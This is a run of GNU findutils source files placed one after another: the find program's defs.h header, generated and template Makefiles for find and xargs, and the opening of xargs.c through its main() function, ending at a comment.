\fBlocate\fP(1L), \fBlocatedb\fP(5L), \fBupdatedb\fP(1L), \fBxargs\fP(1L)
\fBFinding Files\fP (on-line in Info, or printed)
/* defs.h -- data types and declarations.
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#if defined(HAVE_STRING_H) || defined(STDC_HEADERS)
#include <string.h>
#else
#include <strings.h>
#ifndef strchr
#define strchr index
#endif
#ifndef strrchr
#define strrchr rindex
#endif
#endif

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include <time.h>

#include "regex.h"

#if __STDC__
# define P_(s) s
#else
# define P_(s) ()
#endif

/* Not char because of type promotion; NeXT gcc can't handle it.  */
typedef int boolean;
#define		true    1
#define		false	0

/* Pointer to function returning boolean. */
typedef boolean (*PFB)();

/* The number of seconds in a day. */
#define		DAYSECS	    86400

/* Argument structures for predicates. */

enum comparison_type
{
  COMP_GT,
  COMP_LT,
  COMP_EQ
};

enum predicate_type
{
  NO_TYPE,
  PRIMARY_TYPE,
  UNI_OP,
  BI_OP,
  OPEN_PAREN,
  CLOSE_PAREN
};

enum predicate_precedence
{
  NO_PREC,
  COMMA_PREC,
  OR_PREC,
  AND_PREC,
  NEGATE_PREC,
  MAX_PREC
};

struct long_val
{
  enum comparison_type kind;
  unsigned long l_val;
};

struct size_val
{
  enum comparison_type kind;
  int blocksize;
  unsigned long size;
};

struct path_arg
{
  short offset;			/* Offset in `vec' of this arg. */
  short count;			/* Number of path replacements in this arg. */
  char *origarg;		/* Arg with "{}" intact. */
};

struct exec_val
{
  struct path_arg *paths;	/* Array of args with path replacements. */
  char **vec;			/* Array of args to pass to program. */
};

/* The format string for a -printf or -fprintf is chopped into one or
   more `struct segment', linked together into a list.
   Each stretch of plain text is a segment, and
   each \c and `%' conversion is a segment. */

/* Special values for the `kind' field of `struct segment'. */
#define KIND_PLAIN 0		/* Segment containing just plain text. */
#define KIND_STOP 1		/* \c -- stop printing and flush output. */

struct segment
{
  int kind;			/* Format chars or KIND_{PLAIN,STOP}. */
  char *text;			/* Plain text or `%' format string. */
  int text_len;			/* Length of `text'. */
  struct segment *next;		/* Next segment for this predicate. */
};

struct format_val
{
  struct segment *segment;	/* Linked list of segments. */
  FILE *stream;			/* Output stream to print on. */
};

struct predicate
{
  /* Pointer to the function that implements this predicate.  */
  PFB pred_func;

  /* Only used for debugging, but defined unconditionally so individual
     modules can be compiled with -DDEBUG.  */
  char *p_name;

  /* The type of this node.  There are two kinds.  The first is real
     predicates ("primaries") such as -perm, -print, or -exec.  The
     other kind is operators for combining predicates. */
  enum predicate_type p_type;

  /* The precedence of this node.  Only has meaning for operators. */
  enum predicate_precedence p_prec;

  /* True if this predicate node produces side effects. */
  boolean side_effects;

  /* True if this predicate node requires a stat system call to execute. */
  boolean need_stat;

  /* Information needed by the predicate processor.
     Next to each member are listed the predicates that use it. */
  union
  {
    char *str;			/* fstype [i]lname [i]name [i]path */
    struct re_pattern_buffer *regex; /* regex */
    struct exec_val exec_vec;	/* exec ok */
    struct long_val info;	/* atime ctime mtime inum links */
    struct size_val size;	/* size */
    uid_t uid;			/* user */
    gid_t gid;			/* group */
    time_t time;		/* newer */
    unsigned long perm;		/* perm */
    unsigned long type;		/* type */
    FILE *stream;		/* fprint fprint0 */
    struct format_val printf_vec; /* printf fprintf */
  } args;

  /* The next predicate in the user input sequence,
     which repesents the order in which the user supplied the
     predicates on the command line. */
  struct predicate *pred_next;

  /* The right and left branches from this node in the expression
     tree, which represents the order in which the nodes should be
     processed. */
  struct predicate *pred_left;
  struct predicate *pred_right;
};

/* find library function declarations.  */

/* dirname.c */
char *dirname P_((char *path));

/* error.c */
void error P_((int status, int errnum, char *message, ...));

/* listfile.c */
void list_file P_((char *name, char *relname, struct stat *statp, FILE *stream));
char *get_link_name P_((char *name, char *relname));

/* savedir.c */
char *savedir P_((char *dir, unsigned name_size));

/* stpcpy.c */
#if !HAVE_STPCPY
char *stpcpy P_((char *dest, const char *src));
#endif

/* xgetcwd.c */
char *xgetcwd P_((void));

/* xmalloc.c */
#if __STDC__
#define VOID void
#else
#define VOID char
#endif

VOID *xmalloc P_((size_t n));
VOID *xrealloc P_((VOID *p, size_t n));

/* xstrdup.c */
char *xstrdup P_((char *string));

/* find global function declarations.  */

/* fstype.c */
char *filesystem_type P_((char *path, char *relpath, struct stat *statp));

/* parser.c */
PFB find_parser P_((char *search_name));
boolean parse_close P_((char *argv[], int *arg_ptr));
boolean parse_open P_((char *argv[], int *arg_ptr));
boolean parse_print P_((char *argv[], int *arg_ptr));

/* pred.c */
boolean pred_amin P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_and P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_anewer P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_atime P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_close P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_cmin P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_cnewer P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_comma P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_ctime P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_empty P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_exec P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_false P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_fls P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_fprint P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_fprint0 P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_fprintf P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_fstype P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_gid P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_group P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_ilname P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_iname P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_inum P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_ipath P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_links P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_lname P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_ls P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_mmin P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_mtime P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_name P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_negate P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_newer P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_nogroup P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_nouser P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_ok P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_open P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_or P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_path P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_perm P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_print P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_print0 P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_prune P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_regex P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_size P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_true P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_type P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_uid P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_used P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_user P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
boolean pred_xtype P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr));
char *find_pred_name P_((PFB pred_func));
#ifdef DEBUG
void print_tree P_((struct predicate *node, int indent));
void print_list P_((struct predicate *node));
#endif /* DEBUG */

/* tree.c */
struct predicate *get_expr P_((struct predicate **input, int prev_prec));
boolean opt_expr P_((struct predicate **eval_treep));
boolean mark_stat P_((struct predicate *tree));

/* util.c */
char *basename P_((char *fname));
struct predicate *get_new_pred P_((void));
struct predicate *get_new_pred_chk_op P_((void));
struct predicate *insert_primary P_((boolean (*pred_func )()));
void usage P_((char *msg));

extern char *program_name;
extern struct predicate *predicates;
extern struct predicate *last_pred;
extern boolean do_dir_first;
extern int maxdepth;
extern int mindepth;
extern int curdepth;
extern time_t cur_day_start;
extern boolean full_days;
extern boolean no_leaf_check;
extern boolean stay_on_filesystem;
extern boolean stop_at_current_level;
extern boolean have_stat;
extern char *rel_pathname;
#ifndef HAVE_FCHDIR
extern char *starting_dir;
#else
extern int starting_desc;
#endif
extern int exit_status;
extern int path_length;
extern int (*xstat) ();
extern boolean dereference;
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
transform = s,x,x,

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = gcc
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = -DHAVE_CONFIG_H
CPPFLAGS = 
CFLAGS = -g -O
LDFLAGS = 
LIBS = 

find_OBJECTS = find.o fstype.o parser.o pred.o tree.o util.o version.o
NROFF = nroff

SOURCES =  ${find_SOURCES}
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

PROGRAMS = find
find_SOURCES = find.c fstype.c parser.c pred.c tree.c util.c version.c
DIST_OTHER = defs.h
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../lib/libfind.a
MANS = find.1
CONFIG_HEADER = ../config.h

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(find_OBJECTS): ../config.h
install:: install-programs

install-programs: $(PROGRAMS) $(SCRIPTS)
	$(top_srcdir)/mkinstalldirs $(bindir)
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  $(INSTALL_PROGRAM) $$p $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

uninstall:: uninstall-programs

uninstall-programs:
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  rm -f $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

find: $(find_OBJECTS)
	$(CC) -o $@ $(find_OBJECTS) $(LDADD) $(LDFLAGS) $(LIBS)

install:: install-man

install-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\.\([0-9][a-z]*\)$$%\1%'`; \
	  inst=`basename $$man $$sect|sed '$(transform)'`$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  $(top_srcdir)/mkinstalldirs $$mdir; \
	  echo installing $$man as $$mdir/$$inst; \
	  $(INSTALL_DATA) $(srcdir)/$$man $$mdir/$$inst; \
	  cdir=$(mandir)/cat$$sect; \
	  if test -d $$cdir; then \
	    echo formatting $$man as $$cdir/$$inst; \
	    $(NROFF) -man $(srcdir)/$$man > $$cdir/$$inst; \
	  fi; \
	done

uninstall:: uninstall-man

uninstall-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\(\.[0-9][a-z]*\)$$%\1%'; \
	  inst=`basename $$man $sect|sed '$(transform)'`.$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  cdir=$(mandir)/cat$$sect; \
	  rm -f $$mdir/$$inst $$cdir/$$inst; \
	done

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

$(PROGRAMS): ../lib/libfind.a

parser.o: ../lib/modechange.h
find.o fstype.o parser.o pred.o: ../lib/modetype.h
find.o fstype.o parser.o pred.o tree.o util.o: defs.h 
pred.o: ../lib/wait.h
PROGRAMS = xargs
MANS = xargs.1
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../find/version.o ../lib/libfind.a
CONFIG_HEADER = ../config.h

$(PROGRAMS): ../find/version.o ../lib/libfind.a

xargs.o: ../lib/wait.h
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
transform = @program_transform_name@

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = @CC@
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = @DEFS@
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

xargs_SOURCES = xargs.c
xargs_OBJECTS = xargs.o
NROFF = nroff

SOURCES =  xargs.c
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

PROGRAMS = xargs
MANS = xargs.1
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../find/version.o ../lib/libfind.a
CONFIG_HEADER = ../config.h

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(xargs_OBJECTS): ../config.h
install:: install-programs

install-programs: $(PROGRAMS) $(SCRIPTS)
	$(top_srcdir)/mkinstalldirs $(bindir)
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  $(INSTALL_PROGRAM) $$p $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

uninstall:: uninstall-programs

uninstall-programs:
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  rm -f $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

xargs: $(xargs_OBJECTS)
	$(CC) -o $@ $(xargs_OBJECTS) $(LDADD) $(LDFLAGS) $(LIBS)

install:: install-man

install-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\.\([0-9][a-z]*\)$$%\1%'`; \
	  inst=`basename $$man $$sect|sed '$(transform)'`$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  $(top_srcdir)/mkinstalldirs $$mdir; \
	  echo installing $$man as $$mdir/$$inst; \
	  $(INSTALL_DATA) $(srcdir)/$$man $$mdir/$$inst; \
	  cdir=$(mandir)/cat$$sect; \
	  if test -d $$cdir; then \
	    echo formatting $$man as $$cdir/$$inst; \
	    $(NROFF) -man $(srcdir)/$$man > $$cdir/$$inst; \
	  fi; \
	done

uninstall:: uninstall-man

uninstall-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\(\.[0-9][a-z]*\)$$%\1%'; \
	  inst=`basename $$man $sect|sed '$(transform)'`.$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  cdir=$(mandir)/cat$$sect; \
	  rm -f $$mdir/$$inst $$cdir/$$inst; \
	done

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

$(PROGRAMS): ../find/version.o ../lib/libfind.a

xargs.o: ../lib/wait.h
/* xargs -- build and execute command lines from standard input
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Mike Rendell <michael@cs.mun.ca>
   and David MacKenzie <djm@gnu.ai.mit.edu>.  */

#include <config.h>

#if __STDC__
#define P_(s) s
#else
#define P_(s) ()
#endif

#define _GNU_SOURCE
#include <ctype.h>

#if !defined (isascii) || defined (STDC_HEADERS)
#ifdef isascii
#undef isascii
#endif
#define isascii(c) 1
#endif

#ifdef isblank
#define ISBLANK(c) (isascii (c) && isblank (c))
#else
#define ISBLANK(c) ((c) == ' ' || (c) == '\t')
#endif

#define ISSPACE(c) (ISBLANK (c) || (c) == '\n' || (c) == '\r' \
		    || (c) == '\f' || (c) == '\v')

#include <sys/types.h>
#include <stdio.h>
#include <errno.h>
#include <getopt.h>

#if defined(HAVE_STRING_H) || defined(STDC_HEADERS)
#include <string.h>
#if !defined(STDC_HEADERS)
#include <memory.h>
#endif
#else
#include <strings.h>
#define memcpy(dest, source, count) (bcopy((source), (dest), (count)))
#endif

char *strstr ();
char *strdup ();

#ifndef _POSIX_SOURCE
#include <sys/param.h>
#endif

#ifdef HAVE_LIMITS_H
#include <limits.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include <signal.h>

#if !defined(SIGCHLD) && defined(SIGCLD)
#define SIGCHLD SIGCLD
#endif

/* COMPAT:  SYSV version defaults size (and has a max value of) to 470.
   We try to make it as large as possible. */
#if !defined(ARG_MAX) && defined(_SC_ARG_MAX)
#define ARG_MAX sysconf (_SC_ARG_MAX)
#endif
#ifndef ARG_MAX
#define ARG_MAX NCARGS
#endif

#include "wait.h"

/* States for read_line. */
#define NORM 0
#define SPACE 1
#define QUOTE 2
#define BACKSLASH 3

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
void exit ();
void free ();
long strtol ();

extern int errno;
#endif

/* Return nonzero if S is the EOF string.  */
#define EOF_STR(s) (eof_str && *eof_str == *s && !strcmp (eof_str, s))

extern char **environ;

/* Not char because of type promotion; NeXT gcc can't handle it.  */
typedef int boolean;
#define		true    1
#define		false	0

#if __STDC__
#define VOID void
#else
#define VOID char
#endif

VOID *xmalloc P_ ((size_t n));
VOID *xrealloc P_ ((VOID * p, size_t n));
void error P_ ((int status, int errnum, char *message,...));

extern char *version_string;

/* The name this program was run with.  */
char *program_name;

/* Buffer for reading arguments from stdin.  */
static char *linebuf;

/* Line number in stdin since the last command was executed.  */
static int lineno = 0;

/* If nonzero, then instead of putting the args from stdin at
   the end of the command argument list, they are each stuck into the
   initial args, replacing each occurrence of the `replace_pat' in the
   initial args.  */
static char *replace_pat = NULL;

/* The length of `replace_pat'.  */
static size_t rplen = 0;

/* If nonzero, when this string is read on stdin it is treated as
   end of file.
   I don't like this - it should default to NULL.  */
static char *eof_str = "_";

/* If nonzero, the maximum number of nonblank lines from stdin to use
   per command line.  */
static long lines_per_exec = 0;

/* The maximum number of arguments to use per command line.  */
static long args_per_exec = 1024;

/* If true, exit if lines_per_exec or args_per_exec is exceeded.  */
static boolean exit_if_size_exceeded = false;

/* The maximum number of characters that can be used per command line.  */
static long arg_max;

/* Storage for elements of `cmd_argv'.  */
static char *argbuf;

/* The list of args being built.  */
static char **cmd_argv = NULL;

/* Number of elements allocated for `cmd_argv'.  */
static int cmd_argv_alloc = 0;

/* Number of valid elements in `cmd_argv'.  */
static int cmd_argc = 0;

/* Number of chars being used in `cmd_argv'.  */
static int cmd_argv_chars = 0;

/* Number of initial arguments given on the command line.  */
static int initial_argc = 0;

/* Number of chars in the initial args.  */
static int initial_argv_chars = 0;

/* true when building up initial arguments in `cmd_argv'.  */
static boolean initial_args = true;

/* If nonzero, the maximum number of child processes that can be running
   at once.  */
static int proc_max = 1;

/* Total number of child processes that have been executed.  */
static int procs_executed = 0;

/* The number of elements in `pids'.  */
static int procs_executing = 0;

/* List of child processes currently executing.  */
static pid_t *pids = NULL;

/* The number of allocated elements in `pids'. */
static int pids_alloc = 0;

/* Exit status; nonzero if any child process exited with a
   status of 1-125.  */
static int child_error = 0;

/* If true, print each command on stderr before executing it.  */
static boolean print_command = false;

/* If true, query the user before executing each command, and only
   execute the command if the user responds affirmatively.  */
static boolean query_before_executing = false;

static struct option const longopts[] =
{
  {"null", no_argument, NULL, '0'},
  {"eof", optional_argument, NULL, 'e'},
  {"replace", optional_argument, NULL, 'i'},
  {"max-lines", optional_argument, NULL, 'l'},
  {"max-args", required_argument, NULL, 'n'},
  {"interactive", no_argument, NULL, 'p'},
  {"no-run-if-empty", no_argument, NULL, 'r'},
  {"max-chars", required_argument, NULL, 's'},
  {"verbose", no_argument, NULL, 't'},
  {"exit", no_argument, NULL, 'x'},
  {"max-procs", required_argument, NULL, 'P'},
  {"version", no_argument, NULL, 'v'},
  {"help", no_argument, NULL, 'h'},
  {NULL, no_argument, NULL, 0}
};

static int read_line P_ ((void));
static int read_string P_ ((void));
static void do_insert P_ ((char *arg, size_t arglen, size_t lblen));
static void push_arg P_ ((char *arg, size_t len));
static boolean print_args P_ ((boolean ask));
static void do_exec P_ ((void));
static void add_proc P_ ((pid_t pid));
static void wait_for_proc P_ ((boolean all));
static long parse_num P_ ((char *str, int option, long min, long max));
static long env_size P_ ((char **envp));
static void usage P_ ((FILE * stream, int status));

void
main (argc, argv)
     int argc;
     char **argv;
{
  int optc;
  int always_run_command = 1;
  long orig_arg_max;
  char *default_cmd = "/bin/echo";
  int (*read_args) P_ ((void)) = read_line;

  program_name = argv[0];

  orig_arg_max = ARG_MAX - 2048; /* POSIX.2 requires subtracting 2048.  */
  arg_max = orig_arg_max;

  /* Sanity check for systems with huge ARG_MAX defines (e.g., Suns which
     have it at 1 meg).  Things will work fine with a large ARG_MAX but it
     will probably hurt the system more than it needs to; an array of this
     size is allocated.  */
  if (arg_max > 20 * 1024)
    arg_max = 20 * 1024;

  /* Take the size of the environment into account.  */
  arg_max -= env_size (environ);
  if (arg_max <= 0)
    error (1, 0, "environment is too large for exec");

  while ((optc = getopt_long (argc, argv, "+0e::i::l::n:prs:txP:",
			      longopts, (int *) 0)) != -1)
    {
      switch (optc)
	{
	case '0':
	  read_args = read_string;
	  break;

	case 'e':
	  if (optarg)
	    eof_str = optarg;
	  else
	    eof_str = 0;
	  break;

	case 'h':
	  usage (stdout, 0);

	case 'i':
	  if (optarg)
	    replace_pat = optarg;
	  else
	    replace_pat = "{}";
	  /* -i excludes -n -l.  */
	  args_per_exec = 0;
	  lines_per_exec = 0;
	  break;

	case 'l':
	  if (optarg)
	    lines_per_exec = parse_num (optarg, 'l', 1L, -1L);
	  else
	    lines_per_exec = 1;
	  /* -l excludes -i -n.  */
	  args_per_exec = 0;
	  replace_pat = NULL;
	  break;

	case 'n':
	  args_per_exec = parse_num (optarg, 'n', 1L, -1L);
	  /* -n excludes -i -l.  */
	  lines_per_exec = 0;
	  replace_pat = NULL;
	  break;

	case 's':
	  arg_max = parse_num (optarg, 's', 1L, orig_arg_max);
	  break;

	case 't':
	  print_command = true;
	  break;

	case 'x':
	  exit_if_size_exceeded = true;
	  break;

	case 'p':
	  query_before_executing = true;
	  print_command = true;
	  break;

	case 'r':
	  always_run_command = 0;
	  break;

	case 'P':
	  proc_max = parse_num (optarg, 'P', 0L, -1L);
	  break;

	case 'v':
	  printf ("GNU xargs version %s\n", version_string);
	  exit (0);

	default:
	  usage (stderr, 1);
	}
    }

  if (replace_pat || lines_per_exec)
    exit_if_size_exceeded = true;

  if (optind == argc)
    {
      optind = 0;
      argc = 1;
      argv = &default_cmd;
    }

  linebuf = (char *) xmalloc (arg_max + 1);
  argbuf = (char *) xmalloc (arg_max + 1);

  /* Make sure to listen for the kids.  */
  signal (SIGCHLD, SIG_DFL);

  if (!replace_pat)
    {
      for (; optind < argc; optind++)
	push_arg (argv[optind], strlen (argv[optind]) + 1);
      initial_args = false;
      initial_argc = cmd_argc;
      initial_argv_chars = cmd_argv_chars;

      while ((*read_args) () != -1)
	if (lines_per_exec && lineno >= lines_per_exec)
	  {
	    do_exec ();
	    lineno = 0;
	  }

      /* SYSV xargs seems to do at least one exec, even if the
         input is empty.  */
      if (cmd_argc != initial_argc
	  || (always_run_command && procs_executed == 0))
	do_exec ();
    }
  else
    {
      int i;
      size_t len;
      size_t *arglen = (size_t *) xmalloc (sizeof (size_t) * argc);

      for (i = optind; i < argc; i++)
	arglen[i] = strlen(argv[i]);
      rplen = strlen (replace_pat);
      while ((len = (*read_args) ()) != -1)
	{
	  /* Don't do insert on the command name.  */
	  push_arg (argv[optind], arglen[optind] + 1);
	  len--;
	  for (i = optind + 1; i < argc; i++)
	    do_insert (argv[i], arglen[i], len);
	  do_exec ();
	}
    }

  wait_for_proc (true);
  exit (child_error);
}

/* Read a line of arguments from stdin and add them to the list of
   arguments to pass to the command.  Ignore blank lines and initial blanks.
   Single and double quotes and backslashes quote metacharacters and blanks
   as they do in the shell.
